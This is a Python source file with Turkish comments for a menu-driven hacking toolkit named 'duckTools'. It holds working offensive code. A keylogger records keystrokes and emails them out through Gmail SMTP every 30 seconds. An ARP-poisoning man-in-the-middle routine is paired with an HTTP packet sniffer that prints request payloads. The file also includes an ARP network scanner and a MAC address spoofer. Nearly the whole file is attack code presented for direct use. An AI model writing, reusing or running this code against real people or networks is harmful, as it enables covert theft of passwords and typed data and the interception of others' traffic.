import scapy.all as scapy
from colorama import *
import pynput.keyboard
import smtplib
import threading
import subprocess
import time
import random
from scapy_http import http

def Packet_Listener():
    def listen_packets(youriface):
        scapy.sniff(iface=youriface, store=False, prn=analyze_packets)  # store--> yakalanan
        # paketleri belleğe kaydetmek istemiyoruz çünkü bilgisayarı çok yorar. Bunun yerine paketler geldikçe işleyeceğiz. prn-->callback function
        # prn = callback function --> nereye göndereceğini gösteriyoruz.

    def analyze_packets(packet):

        # packet.show()
        if (packet.haslayer(http.HTTPRequest)):  # http katmanındaki
            if (packet.haslayer(scapy.Raw)):  # Raw katmanındaki
                print("Paketler alınıyor...")
                print(packet[scapy.Raw].load)  # load kısmını gösterir.

    youriface = input("Dinlemek istediğiniz interface'i giriniz: ")

    listen_packets(youriface)


def Arp_Poison():
    def get_mac_address(ip):
        # 1 -->arp_request
        arp_request_packet = scapy.ARP(pdst=ip)  # verilen ip ağı arasında tarama yapmak için bir paket oluşturuldu.
        print("Paket oluşturuluyor...")
        # 2 --> broadcast

        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # bütün mac adreslerine yayın yapması için.

        combined_packet = broadcast_packet / arp_request_packet  # iki farklı paketi al ve birleştir.
        print("Paketler birleştiriliyor...")
        answered_list = scapy.srp(combined_packet, timeout=5, verbose=False)[
            0]  # birleştirilmiş paketleri gönderir ve cevap verilmezse devam et anlamında timeout belirledik.
        print("Paketler gönderiliyor...")
        print("Paketler alınıyor...")
        return answered_list[0][1].hwsrc

    def arp_poisoner(target_ip, poisoned_ip):

        target_mac = get_mac_address(target_ip)
        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                 psrc=poisoned_ip)  # op --> response olduğunu belirlemek için, # pdst --> hedef ip, hwdst --> hedef mac psrc --> source ip yani modemin ip'si
        scapy.send(arp_response, verbose=False)

    def arp_reset(fooled_ip, gateway_ip):
        print("Hedef arp tablosu düzeltildi.")

        fooled_mac = get_mac_address(fooled_ip)
        gateway_mac = get_mac_address(gateway_ip)
        arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip,
                                 hwsrc=gateway_mac)  # op --> response olduğunu belirlemek için, # pdst --> hedef ip, hwdst --> hedef mac psrc --> source ip yani modemin ip'si

        scapy.send(arp_response, verbose=False, count=5)
        print(Style.RESET_ALL)

    target_ip = input("hedef ip'yi girin:")
    poisoned_ip = input("Zehirlemek için kullanılacak ip'yi girin:")
    print("\t\t\t\t\t\t\t\tÇift taraflı zehirleme adımı")
    target_ip2 = input("hedef ip'yi girin:")
    poisoned_ip2 = input("Zehirlemek için kullanılacak ip'yi girin:")
    print(Style.RESET_ALL)

    try:
        while (True):
            arp_poisoner(target_ip, poisoned_ip)
            arp_poisoner(target_ip2, poisoned_ip2)

            time.sleep(5)
    except KeyboardInterrupt:
        print("\n Quit & Reset")
        arp_reset(target_ip, poisoned_ip)
        arp_reset(target_ip2, poisoned_ip2)


def Mymacchange():
    interface = input("Değiştirmek istediğiniz interface girin:(çıkmak için 'q' giriniz) ")
    
    if interface == "q":
        print("Programdan çıkılıyor...")
    
    else:
    
        mac = "00:22:33:77:99:11"
    
        subprocess.call(["ifconfig",interface,"down"])
        subprocess.call(["ifconfig",interface,"hw","ether",mac])
        subprocess.call(["ifconfig",interface,"up"])
        print("Mac adresi değiştirildi!!!")

def scan_my_network(ip):
    #1 -->arp_request
    arp_request_packet = scapy.ARP(pdst=inpdst)# verilen ip ağı arasında tarama yapmak için bir paket oluşturuldu.
    print("Paket oluşturuluyor...")
    #2 --> broadcast

    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")# bütün mac adreslerine yayın yapması için.

    combined_packet = broadcast_packet/arp_request_packet # iki farklı paketi al ve birleştir.
    print("Paketler birleştiriliyor...")
    (answered_list,unanswered_list) = scapy.srp(combined_packet,timeout=5)#birleştirilmiş paketleri gönderir ve cevap verilmezse devam et anlamında timeout belirledik.
    print("Paketler gönderiliyor...")
    print("Paketler alınıyor...")
    print("Sonuçlar:")
    answered_list.summary()
    print(Style.RESET_ALL)


def MyKeyLogger():
    def callback_function(key):
        global log
        try:

            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + str(key)
        print(log)

    def send_email(email, password, logs):
        email_server = smtplib.SMTP("smtp.gmail.com", 587)
        email_server.starttls()
        email_server.login(email, password)
        email_server.sendmail(email, email, logs)
        email_server.quit()

    def thread_function():
        global log
        send_email("ornekmail", "orneksifre", log)
        log = ""
        timer_object = threading.Timer(30, thread_function)
        timer_object.start()

    keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

    with keylogger_listener:
        thread_function()
        keylogger_listener.join()
print(Fore.MAGENTA)
print("\t\t\t//////////////\t"+"\t"+"\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
print("\t\t//////////////\t"+"       duckTools"+"\t"+"\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
print("\t//////////////"+"\t"+"\t\t\t\t"+"\t\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
print("\t\t//////////////\t"+"       duckTools"+"\t"+"\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
print("\t\t\t//////////////\t"+"\t"+"\\\\\\\\\\\\\\\\\\\\\\\\\\\\"+"\n\n")

while(True):
    print("ARAÇLAR")
    print(Fore.RED +"1-) NetScanner")
    print(Fore.GREEN +"2-) MyKeyLogger")
    print(Fore.BLUE+"3-) Mymacchanger")
    print(Fore.CYAN+"4-) My_MITM(Man in the middle)")
    print(Fore.RESET)

    secim = input("Seçmek istediğiniz program: (çıkmak için 'q')")

    if(secim == "1"):
        print(Fore.RED+ "NetScanner programı açıldı!")
        inpdst = input("sorgulamak istediğiniz ip'yi veya ip aralığını giriniz:")
        scan_my_network(inpdst)
    elif(secim == "2"):
        print(Fore.GREEN+ "MyKeyLogger programı açıldı!")
        log = ""
        MyKeyLogger()
    elif(secim == "3"):
        print(Fore.BLUE+ "Mymacchanger programı açıldı!")
        Mymacchange()
    elif(secim == "4"):
        print(Fore.CYAN+ "My_MITM programı açıldı!")
        Arp_Poison()
        Packet_Listener()
    elif(secim == "q"):
        print("Programdan çıkıyor")
        print(Fore.RESET)
        break
    else:
        print("Geçersiz girdi, Lütfen seçmek istediğiniz programı girin (1,2,3,4), çıkmak için q girin.")

















